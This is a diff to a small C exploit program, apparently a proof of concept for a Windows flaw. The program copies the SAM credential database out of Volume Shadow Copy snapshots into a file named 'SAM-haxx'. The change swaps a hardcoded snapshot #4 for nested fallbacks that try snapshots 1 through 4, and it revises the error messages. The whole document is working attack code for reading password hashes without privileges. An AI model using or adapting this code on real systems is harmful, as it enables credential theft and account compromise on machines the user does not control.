@@ -3,9 +3,10 @@
 
 // History
 // 0.1 - 20/07/2021 - Initial version
-
+// 0.2 - 20/07/2021 - Adds support for 4 snapshots
+// 
 // Bugs and issues
-// Hardcoded for snapshot #4, as this works on my PC - really, it should cycle through them all to find the latest.
+// - Dunno
 
 #include <windows.h>
 #include <stdio.h>
@@ -17,20 +18,29 @@ void main()
     DWORD  dwBytesRead, dwBytesWritten, dwPos;
     BYTE   buff[4096];
 
-    // Currently hard coded to VSC #4 as I'm lame
+    // Check out this mess, looks for VSC #1, #2, #3, #4 only.  Lolz.
 
-    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SAM"), // open SAM
-        GENERIC_READ,             // open for reading
-        0,                        // do not share
-        NULL,                     // no security
-        OPEN_EXISTING,            // existing file only
-        FILE_ATTRIBUTE_NORMAL,    // normal file
-        NULL);                    // no attr. template
+    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM"),GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
 
     if (hFile == INVALID_HANDLE_VALUE)
     {
-        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to VSC snapshot 4 which may fail");
-        return;
+        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        if (hFile == INVALID_HANDLE_VALUE)
+        {
+            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+            if (hFile == INVALID_HANDLE_VALUE)
+            {
+                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+                if (hFile == INVALID_HANDLE_VALUE)
+                {
+                    printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows");
+                    return;
+                }
+            }
+        }
     }
 
     // Open the existing file, or if the file does not exist,
@@ -46,7 +56,7 @@ void main()
 
     if (hAppend == INVALID_HANDLE_VALUE)
     {
-        printf("Could not write SAM-haxx - permission issue rather than vulnerability issue");
+        printf("Could not write SAM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to");
         return;
     }
 
